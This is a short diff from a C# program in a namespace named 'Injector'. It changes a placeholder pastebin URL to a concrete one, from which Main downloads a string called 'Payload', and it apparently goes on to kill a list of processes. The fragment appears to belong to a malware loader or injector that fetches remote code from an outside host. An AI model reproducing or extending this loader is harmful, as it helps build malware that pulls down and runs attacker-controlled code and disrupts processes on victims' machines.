@@ -32,7 +32,7 @@ namespace Injector
 
         internal static void Main()
         {
-            var Payload = new WebClient().DownloadString("https://pastebin.com/raw/xxxxx");
+            var Payload = new WebClient().DownloadString("https://pastebin.com/raw/DDWmFprL");
 
             ProcessToKill.ForEach(proc =>
             {
